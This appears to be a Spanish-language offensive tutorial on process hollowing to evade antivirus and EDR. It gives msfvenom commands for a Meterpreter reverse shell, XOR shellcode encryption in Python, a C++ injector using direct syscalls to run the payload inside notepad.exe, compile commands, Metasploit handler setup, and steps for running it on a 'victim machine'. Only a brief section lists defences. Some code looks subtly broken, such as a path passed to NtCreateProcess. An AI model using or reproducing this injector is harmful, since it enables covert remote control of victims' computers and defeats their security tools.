# Guía Avanzada: Process Hollowing para Evasión de AV/EDR

## 🎭 **1. ¿Qué es Process Hollowing?**

Process Hollowing es una técnica en la que:

1. Se crea un proceso suspendido de un binario legítimo (ej. `notepad.exe`).
2. Se reemplaza su código con un payload malicioso.
3. Se reanuda el proceso con el código malicioso ejecutándose en su espacio de memoria.

Esta técnica permite evadir muchos antivirus porque el proceso parece legítimo.

---

## 🛠 **2. Generar el Payload de Meterpreter**

Ejecutar en Kali Linux:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TU_IP LPORT=PUERTO -f raw -o shellcode.bin
```

- `LHOST`: IP del atacante.
- `LPORT`: Puerto de escucha.

---

## 🏗 **3. Cifrar el Shellcode**

Para evadir detección, aplicamos un cifrado simple XOR:

```python
shellcode = open("shellcode.bin", "rb").read()
encrypted_shellcode = bytearray([b ^ 0x55 for b in shellcode])

with open("shellcode_encrypted.bin", "wb") as f:
    f.write(encrypted_shellcode)
```

Este `shellcode_encrypted.bin` se incluirá en `encrypted_shellcode[]` en el código C++.

---

## 💻 **4. Código Mejorado en C++**

Este código usa **syscalls directas** para evitar detección por antivirus:

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include "syscalls.h"  // Implementación de syscalls directas

unsigned char encrypted_shellcode[] = { /* Shellcode cifrado */ };
size_t shellcode_size = sizeof(encrypted_shellcode);

void decrypt_shellcode(unsigned char* shellcode, size_t size) {
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= 0x55;
    }
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    if (!NtCreateProcess("C:\\Windows\\System32\\notepad.exe", &si, &pi)) {
        std::cerr << "Error al crear el proceso" << std::endl;
        return 1;
    }
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    NtGetThreadContext(pi.hThread, &ctx);
    LPVOID alloc = NULL;
    NtAllocateVirtualMemory(pi.hProcess, &alloc, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    decrypt_shellcode(encrypted_shellcode, shellcode_size);
    NtWriteVirtualMemory(pi.hProcess, alloc, encrypted_shellcode, shellcode_size, NULL);
    #ifdef _WIN64
        ctx.Rip = (DWORD64)alloc;
    #else
        ctx.Eip = (DWORD)alloc;
    #endif
    NtSetThreadContext(pi.hThread, &ctx);
    NtResumeThread(pi.hThread);
    std::cout << "Proceso inyectado exitosamente" << std::endl;
    return 0;
}
```

---

## 🔧 **5. Compilar el Código**

### 📌 **Con MinGW**

```bash
x86_64-w64-mingw32-g++ process_hollowing_adv.cpp -o injector.exe -static -lntdll
```

### 📌 **Con Visual Studio**

```bash
cl.exe /EHsc process_hollowing_adv.cpp /Fe:injector.exe
```

---

## 🎯 **6. Configurar Metasploit para Recibir la Conexión**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST TU_IP
set LPORT PUERTO
exploit
```

---

## 🚀 **7. Ejecutar el **``** en la Máquina Víctima**

```bash
injector.exe
```

Si todo sale bien, se abrirá `notepad.exe`, pero realmente ejecutará **Meterpreter** en segundo plano.

---

## 🛡 **8. Cómo Defenderse**

Para hacer el informe más completo, menciona las defensas contra este ataque: ✅ **Windows Defender ASR Rules** → Bloquear procesos suspendidos. ✅ **Sysmon + SIEM** → Detectar procesos que escriben en otros procesos. ✅ **EDR (CrowdStrike, SentinelOne, etc.)** → Monitorear ejecución de código en memoria.

---

## 📌 **Conclusión**

✅ Ahora tienes un `injector.exe` con **syscalls directas, cifrado y menos indicadores forenses**. Si quieres más mejoras como **inyección en **``** o técnicas anti-debugging**, ¡sigue investigando! 😈🚀

